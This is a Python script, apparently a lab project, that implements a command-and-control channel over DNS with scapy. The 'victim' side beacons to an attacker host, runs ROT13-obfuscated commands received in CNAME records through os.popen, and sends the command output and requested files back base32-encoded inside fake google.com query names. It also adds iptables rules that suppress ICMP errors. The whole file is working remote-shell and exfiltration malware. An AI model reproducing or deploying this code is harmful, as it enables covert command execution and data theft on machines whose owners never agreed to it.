###############################################################
#  C&C over DNS                                               #
#  using local computer as victim and AWS machine as attacker #
#  November 2023                                              #
###############################################################

#THINGS TO DO BEAFOR RUNNING:
# in the AWS machine we need to add Inbound rules (in the AWS web) 
# 1. DNS (UDP)
# 2. AL ICMP- IPv4
# Change the "ATTACKER_IP" to AWS public IP 



from scapy.layers.dns import *
from scapy.all import *
from enum import Enum
import base64
import time
import os


segment = []

BEACON_ID = 6
COMMAND_ID = 7
FILE_TRANSFER_ID = 8

ECHO_REQUEST = 8
ECHO_REPLAY = 0
MAX_DATA = 8
DNS_PORT = 53
ID = 291

ATTACKER_IP = " " #AWS public ip 	
VICTIM_FILTER = f"udp port {DNS_PORT} and ip src {ATTACKER_IP}"
SERVER_FILTER = f"udp port 53"

class handle(Enum):
    BEACON = 1
    COMMAND = 2
    FILE_TRANSFER = 3

rot13 = str.maketrans(
    'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
    'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')
derot13 = str.maketrans(
    'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm',
    'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz')


#####################################################################


class Attacker:
	def __init__(self):
		os.system("iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")

	def check_packet(self, pkt):
		if pkt[0][DNS].rcode == BEACON_ID:
			return handle.BEACON
		if pkt[0][DNS].rcode == COMMAND_ID:
			return handle.COMMAND
		if pkt[0][DNS].rcode == FILE_TRANSFER_ID:
			return handle.FILE_TRANSFER
		else:
			return 0
				
	def beacon_handler(self, pkt):
		global ID
		ID = pkt[0][DNS].id
		command = input("(#) enter a command:\n(#)Type get + file path to transfer a file\n(#) ")
		command = command.translate(rot13)
		new_pkt = IP(dst=pkt[0][IP].src)/UDP(dport=pkt[0][UDP].sport, 
				       sport=pkt[0][UDP].dport)/DNS(id=pkt[0][DNS].id, 
					rcode=BEACON_ID, qd=pkt[0][DNS].qd, aa=1, rd=0, qr=1, 
					an=DNSRR(rrname=pkt[0][DNS].qd.qname, rdata=f"{command}", ttl=64, type="CNAME"))
		ret = send(new_pkt, verbose=False)
		#new_pkt.show()

		
	def answer_handler(self, pkt):
		global ID
		ID = pkt[0][DNS].id
		for i in range(3):
			send(IP(dst=pkt[0][IP].src)/UDP(dport=pkt[0][UDP].sport,
								    sport=pkt[0][UDP].dport)/DNS(id=pkt[0][DNS].id, rcode=COMMAND_ID,
										  qd=pkt[0][DNS].qd, aa=1, rd=0, qr=1,
										    an=DNSRR(rrname="google.com", rdata=ATTACKER_IP)), verbose=False)

	def file_transfer_handler(self, pkt, path):
		global ID
		global segment
		ID = pkt[0][DNS].id
		if pkt[0][DNS].qd.qname.decode()[:-5] != "linux":
			seg = pkt[0][DNS].qd.qname.decode('ascii')
			seg = seg[2:].split('\'.google.com')[0]
			de_seg = base64.b32decode(seg)
			segment.append(de_seg)
		elif segment == 5:
			return
		else:
			print("recieving")
			with open(path, "wb") as file:
				for i in segment:
					file.write(bytes(i))
			file.close()
			segment = 5
		for i in range(3):
			send(IP(dst=pkt[0][IP].src)/UDP(dport=pkt[0][UDP].sport,
								    sport=pkt[0][UDP].dport)/DNS(id=pkt[0][DNS].id, rcode=FILE_TRANSFER_ID,
										  qd=pkt[0][DNS].qd, aa=1, rd=0, qr=1, an=DNSRR(rrname="google.com",
														   rdata=ATTACKER_IP)), verbose=False)
	
	def __del__(self):
		os.system("iptables -D OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")


##################################################################################3


class Victim:
	def __init__(self):
		os.system("iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
		
	def check_packet(self, pkt):
		if pkt[0][IP].src == ATTACKER_IP:
			if pkt[0][DNS].rcode == BEACON_ID:
				return handle.BEACON
			if pkt[0][DNS].rcode == COMMAND_ID:
				return handle.COMMAND
			if pkt[0][DNS].rcode == FILE_TRANSFER_ID:
				return handle.FILE_TRANSFER
		else:
			return 0
		
	def beaconing(self):
		global ID
		dns_req = IP(dst=ATTACKER_IP)/UDP(dport=DNS_PORT, sport=DNS_PORT)/DNS(rcode=BEACON_ID, id=ID, qd=DNSQR(qname="tg.google.com", qtype="CNAME"))
		send(dns_req, verbose=False)
		ID = ID + 1	

	def command_handler(self, pkt):
		global ID
		command = pkt[0][DNS].an.rdata.decode('utf-8')[:-1]
		command = command.translate(derot13)
		if command.split()[0] == "get":
			self.file_transfer(pkt, file_path=command.split()[1])
			return
		res = os.popen(command).read()
		res = res.translate(rot13)
		dns_ans = IP(dst=ATTACKER_IP)/UDP(dport=DNS_PORT, sport=DNS_PORT)/DNS(rcode=COMMAND_ID, id=ID, qd=DNSQR(qname=f"{res}.google.com"))
		ack = pkt
		if len(res) > MAX_DATA:
			self.fragment(pkt, res)
			return
		ID = ID + 1
		while not ack or ack[0][DNS].rcode != COMMAND_ID:
			sent = send(dns_ans, verbose=False)
			ack = sniff(filter=VICTIM_FILTER, count=1, timeout=2) ## 2

	def file_transfer(self, pkt, file_path):
		global ID
		ack = pkt
		with open(file_path, mode="rb") as file:
			data = file.read()
		for datum in range(0, len(data), MAX_DATA):
			print(f"transfering {datum}")
			ID = ID + 1
			seg = base64.b32encode(data[datum:datum+MAX_DATA])
			#print(seg)
			while not ack or ack[0][DNS].id != ID:
				send(IP(dst=ATTACKER_IP)/UDP(dport=53, sport=53)/DNS(rcode=FILE_TRANSFER_ID, id=ID, qd=DNSQR(qname=f"{seg}.google.com")), verbose=False)
				ack = sniff(filter=VICTIM_FILTER, count=1, timeout=5) ## 5
		for i in range(3):
			send(IP(dst=ATTACKER_IP)/UDP(dport=53, sport=53)/DNS(rcode=FILE_TRANSFER_ID, id=ID, qd=DNSQR(qname="linux.com")), verbose=False)

	def fragment(self, pkt, data):
		global ID
		ack = pkt
		for datum in range(0, len(data), MAX_DATA):
			ID = ID + 1
			while not ack or ack[0][DNS].id != ID:
				send(IP(dst=ATTACKER_IP)/UDP(dport=DNS_PORT, sport=DNS_PORT)/DNS(rcode=COMMAND_ID, id=ID, qd=DNSQR(qname=f"{data[datum:datum+MAX_DATA]}.google.com")), verbose=False)
				ack = sniff(filter=VICTIM_FILTER, count=1, timeout=5)  ## 5
		
	def __del__(self):
		os.system("iptables -D OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")


##################################################################################3


def main():
	position = input("Enter 'attacker' or 'victim' to choose position: ")
	if position == "attacker":
		print("(#) welcome Attacker")
		attacker = Attacker()
		while True:
			try:
				pkt = sniff(filter=SERVER_FILTER, count=1)
				ret = attacker.check_packet(pkt)
				match ret:
					case handle.BEACON:
						attacker.beacon_handler(pkt)
					case handle.COMMAND:
						attacker.answer_handler(pkt)
					case handle.FILE_TRANSFER:
						attacker.file_transfer_handler(pkt, "./TRANSFERD_FILE.txt")
					case _:
						time.sleep(2)
						continue

			except KeyboardInterrupt:
				break

	if position == "victim":
		victim = Victim()
		while True:
			victim.beaconing()
			try:
				pkt = sniff(filter=VICTIM_FILTER, count=1, timeout=5)
				if pkt:
					ret = victim.check_packet(pkt)
					match ret:
						case handle.BEACON:
							victim.command_handler(pkt)
						case _:
							time.sleep(2)
							continue
			except KeyboardInterrupt:
				break
	print("Exiting...!")



if __name__ == "__main__":
	main()
